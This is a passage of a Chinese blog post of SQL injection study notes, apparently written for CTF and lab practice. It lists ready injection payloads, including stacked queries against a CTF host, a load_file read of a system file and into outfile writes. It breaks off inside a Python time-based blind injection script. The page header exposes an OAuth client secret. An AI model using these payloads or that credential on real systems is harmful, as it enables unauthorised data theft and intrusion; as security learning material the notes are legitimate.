<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="sql注入"><meta name="keywords" content=""><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>sql注入【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql基础知识"><span class="toc-number">1.</span> <span class="toc-text">mysql基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#字符串截取函数"><span class="toc-number">1.1.</span> <span class="toc-text">字符串截取函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符串比较"><span class="toc-number">1.2.</span> <span class="toc-text">字符串比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符串连接函数"><span class="toc-number">1.3.</span> <span class="toc-text">字符串连接函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些绕过注入的罕见函数"><span class="toc-number">1.4.</span> <span class="toc-text">一些绕过注入的罕见函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#运算符"><span class="toc-number">1.5.</span> <span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用函数"><span class="toc-number">1.6.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些构造语句"><span class="toc-number">1.7.</span> <span class="toc-text">一些构造语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本信息"><span class="toc-number">1.8.</span> <span class="toc-text">基本信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#手工注入基本流程"><span class="toc-number">2.</span> <span class="toc-text">手工注入基本流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#注入类型"><span class="toc-number">3.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#堆叠查询"><span class="toc-number">3.1.</span> <span class="toc-text">堆叠查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-number">3.2.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-number">3.2.1.</span> <span class="toc-text">get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2post"><span class="toc-number">3.2.2.</span> <span class="toc-text">0x2post</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#布尔盲注"><span class="toc-number">3.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入盲注"><span class="toc-number">3.4.</span> <span class="toc-text">报错注入盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">3.5.</span> <span class="toc-text">报错注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#注入方式"><span class="toc-number">4.</span> <span class="toc-text">注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#limit-注入"><span class="toc-number">4.1.</span> <span class="toc-text">limit 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">4.2.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#笛卡尔积注入"><span class="toc-number">4.3.</span> <span class="toc-text">笛卡尔积注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql约束攻击"><span class="toc-number">4.4.</span> <span class="toc-text">mysql约束攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by-注入"><span class="toc-number">4.5.</span> <span class="toc-text">order by 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5注入"><span class="toc-number">4.6.</span> <span class="toc-text">MD5注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert、update和delete报错注入"><span class="toc-number">4.7.</span> <span class="toc-text">insert、update和delete报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二次注入"><span class="toc-number">4.8.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns注入"><span class="toc-number">4.9.</span> <span class="toc-text">dns注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sprintf注入"><span class="toc-number">4.10.</span> <span class="toc-text">sprintf注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REGEXP注入分析"><span class="toc-number">4.11.</span> <span class="toc-text">REGEXP注入分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LIKE注入分析"><span class="toc-number">4.12.</span> <span class="toc-text">LIKE注入分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无列名注入"><span class="toc-number">4.13.</span> <span class="toc-text">无列名注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入绕过"><span class="toc-number">5.</span> <span class="toc-text">sql注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤空格"><span class="toc-number">5.1.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤引号"><span class="toc-number">5.2.</span> <span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤逗号"><span class="toc-number">5.3.</span> <span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤注释符（-和-–-）"><span class="toc-number">5.4.</span> <span class="toc-text">过滤注释符（ # 和 – ）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤比较符号-（-lt-和-gt-）"><span class="toc-number">5.5.</span> <span class="toc-text">过滤比较符号 （ &lt; 和 &gt; ）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤等号（-）"><span class="toc-number">5.6.</span> <span class="toc-text">过滤等号（ &#x3D; ）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤union，select，where等"><span class="toc-number">5.7.</span> <span class="toc-text">过滤union，select，where等</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他"><span class="toc-number">5.8.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color0"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color4"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">188</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">151</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">sql注入</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-12-06 | 更新于 2021-04-04</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"></div><div class="button-hover tags"></div></div></div><div class="main-content"><p>SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</p>
<a id="more"></a>
<p><img src="../../images/loopholes/sql/sql.png" alt=""><br><a href="https://www.smi1e.top/sql%e6%b3%a8%e5%85%a5%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">Sql注入笔记</a></p>
<h1 id="mysql基础知识"><a href="#mysql基础知识" class="headerlink" title="mysql基础知识"></a>mysql基础知识</h1><h2 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(str,len)  //从左边开始截取len个字符</span><br><span class="line"></span><br><span class="line">right(str,len) //从右边第index开始截取字符</span><br><span class="line"></span><br><span class="line">substring(str,pos) //从左边index开始截取</span><br><span class="line"></span><br><span class="line">substr(str, pos, len)  //将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 </span><br><span class="line"></span><br><span class="line">mid(str,pos,ken) //截取str 从index开始,截取len的长度</span><br></pre></td></tr></table></figure>
<h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</span><br><span class="line">find_in_set(str,strlist) //如果相同则返回1不同则返回0 </span><br><span class="line"></span><br><span class="line">locate(subStr,string) ：判断字符串（string）中是否包含另一个字符串（subStr），函数返回subStr在string中出现的位置。 如果字符串 string 包含 subStr  locate(subStr,string) &gt; 0. 如果字符串 string 不包含 subStr   locate(subStr,string) = 0</span><br></pre></td></tr></table></figure>
<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2) //将字符串首尾相连</span><br><span class="line"></span><br><span class="line">concat_ws(separator,str1,str2) //将字符串用指定连接符连接</span><br><span class="line"></span><br><span class="line">group_concat()//用于把多条数据一次注入出来</span><br></pre></td></tr></table></figure>
<h2 id="一些绕过注入的罕见函数"><a href="#一些绕过注入的罕见函数" class="headerlink" title="一些绕过注入的罕见函数"></a>一些绕过注入的罕见函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">instr(str1,substr) //从子字符串中返回子串第一次出现的位置</span><br><span class="line"></span><br><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>算术运算符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * /</span><br></pre></td></tr></table></figure>
<p>比较运算符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">= &lt;&gt; != &gt; &lt;</span><br><span class="line"></span><br><span class="line">(1)between //select database() between 0x61 and 0x7a; //select database() between <span class="string">'a'</span> and <span class="string">'z'</span>;</span><br><span class="line">(2)<span class="keyword">in</span> //select <span class="string">'123'</span> <span class="keyword">in</span> (<span class="string">'12'</span>) =&gt; 0</span><br><span class="line">(3)like(模糊匹配) //select <span class="string">'12345'</span> like <span class="string">'12%'</span> =&gt; <span class="literal">true</span></span><br><span class="line">(4)regexp 或 rlike(正则匹配)//select <span class="string">'123455'</span> regexp <span class="string">'^12'</span> =&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p> 逻辑运算符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line">AND 逻辑与 == &amp;&amp;</span><br><span class="line">OR 逻辑或 == ||</span><br><span class="line">XOR 逻辑异或 == ^</span><br></pre></td></tr></table></figure>
<p>位运算符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; 按位与</span><br><span class="line">| 按位或</span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></table></figure>
<p>注释符</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># //单行注释符,url记得编码为%23</span></span><br><span class="line">/**/ </span><br><span class="line">--+</span><br></pre></td></tr></table></figure>
<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p> 延时函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(duration) //暂停duration秒</span><br><span class="line">benchmark(count,expr) //重复执行count次expr</span><br></pre></td></tr></table></figure>
<p> 编码函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONV(N,from_base,to_base) //N是要转换的数据，from_base是原进制，to_base是目标进制 </span><br><span class="line">hex(num) //转化成16进制</span><br><span class="line">unhex() </span><br><span class="line">ord(str)   //返回字符串第一个字符的ASCII 值</span><br><span class="line">ascii(str) //返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</span><br></pre></td></tr></table></figure>
<p>文件函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select 1,2,load_file('</span>/etc/init.d/httpd<span class="string">')  //读取文件</span></span><br><span class="line"><span class="string">select xxoo into outfile '</span>路径<span class="string">' //权限较高时可直接写文件</span></span><br></pre></td></tr></table></figure>
<h2 id="一些构造语句"><a href="#一些构造语句" class="headerlink" title="一些构造语句"></a>一些构造语句</h2><p>条件语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(expr1,expr2,expr3) // expr1 <span class="literal">true</span>执行expr2否则执行expr3</span><br><span class="line"><span class="keyword">case</span> when....then....else...end</span><br><span class="line">select <span class="keyword">case</span> when (条件) <span class="keyword">then</span> 代码1 <span class="keyword">else</span> 代码 2 end</span><br><span class="line">IFNULL() </span><br><span class="line">NULLIF()</span><br><span class="line"></span><br><span class="line">MAKE_SET(bits,str1,str2,…)//返回一个设定值(含子字符串分隔字符串<span class="string">","</span>字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果。例如，select make_set(<span class="string">"1"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>); bits将转为二进制,1的二进制为0000 0001,倒过来为1000 0000,所以取str1(a),打印a</span><br></pre></td></tr></table></figure>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user()：当前数据库用户</span><br><span class="line">database()：当前数据库名 </span><br><span class="line">version()：当前使用的数据库版本  </span><br><span class="line">@@datadir：数据库存储数据路径  </span><br><span class="line">length(str) ：返回字符串str的长度     </span><br><span class="line">information_schema //系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</span><br><span class="line">SCHEMATA//储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</span><br><span class="line">TABLES//储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</span><br><span class="line">COLUMNS//储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</span><br></pre></td></tr></table></figure>


<h1 id="手工注入基本流程"><a href="#手工注入基本流程" class="headerlink" title="手工注入基本流程"></a>手工注入基本流程</h1><p>MySQL &gt;= 5.0<br> 获取字段数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure>
<p> 获取当前数据库名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
<p>获取数据库中的表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure>
<p> 获取表中的字段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=database() and table_name=<span class="string">'users</span></span><br></pre></td></tr></table></figure>
<p>OX5 获取各个字段值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>来自于强网杯的第三届强网杯的一题<br>题目过滤了查询删除更新插入等语句<br><img src="../../images/loopholes/sql/1.png" alt=""><br>查看表名     </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';show tables;</span></span><br></pre></td></tr></table></figure>
<p><img src="../../images/loopholes/sql/3.png" alt=""><br>查看字段 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';desc `1919810931114514`;</span></span><br></pre></td></tr></table></figure>
<p><img src="../../images/loopholes/sql/2.png" alt=""><br>查看数据  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.39.172:31796/?inject=0<span class="string">';show tables;SET @haha_test = CONCAT('</span>S<span class="string">','</span>ELECT * from `1919810931114514`<span class="string">');PREPARE pr2 FROM @haha_test;EXECUTE pr2 ;</span></span><br></pre></td></tr></table></figure>
<p><img src="../../images/loopholes/sql/4.png" alt=""> </p>
<p>[SUCTF 2019]EasySQL</p>
<p>后台sql语句如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_GET[<span class="string">'query'</span>] || flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure>
<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">if</span>((ascii(substr((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1,1))=97),sleep(5),0)</span><br></pre></td></tr></table></figure>
<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: ye1s</span></span><br><span class="line"><span class="comment"># @Date:   2019-01-15 16:21:36</span></span><br><span class="line"><span class="comment"># @Last Modified by:   ye1s</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-01-15 22:07:34</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">chars=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~\""</span></span><br><span class="line">url=<span class="string">"http://61.10.10.128/sqli/Less-5/?id=1"</span></span><br><span class="line">def getDbname():<span class="comment">#爆数据库</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0)%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line">		<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">			startTime=time.time()</span><br><span class="line">			newurl=url+payload.format(i,ord(char))</span><br><span class="line">			response=requests.get(newurl)</span><br><span class="line">			<span class="keyword">if</span> time.time()-startTime&gt;5: <span class="comment">#页面判断语句记得修改</span></span><br><span class="line">				result +=char</span><br><span class="line">				<span class="built_in">print</span> <span class="string">"dbname is:"</span>+result</span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">				<span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def getTablename():<span class="comment">#爆表名</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(0,15):</span><br><span class="line">		tablename=<span class="string">""</span></span><br><span class="line">		flag=0</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(1,33):</span><br><span class="line">			<span class="keyword">if</span> flag==1: <span class="comment">#判断是否得到一个表名</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">				startTime=time.time()</span><br><span class="line">				newurl=url+payload.format(i,j,ord(char))</span><br><span class="line">				response=requests.get(newurl)</span><br><span class="line">				<span class="keyword">if</span> time.time()-startTime&gt;5:</span><br><span class="line">					tablename +=char</span><br><span class="line">					<span class="built_in">print</span> <span class="string">"tablename is:"</span>+tablename</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"\""</span> == char:</span><br><span class="line">					flag=1</span><br><span class="line">					result +=<span class="string">" "</span>+str(i)+<span class="string">":"</span>+tablename</span><br><span class="line">					<span class="keyword">if</span> tablename.strip()==<span class="string">''</span>:</span><br><span class="line">						<span class="built_in">return</span></span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">def getColumns(tablename):<span class="comment">#爆列名</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	payload=<span class="string">"'and if((ascii(substr((select column_name from information_schema.columns where table_name="</span>+tablename+<span class="string">" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> 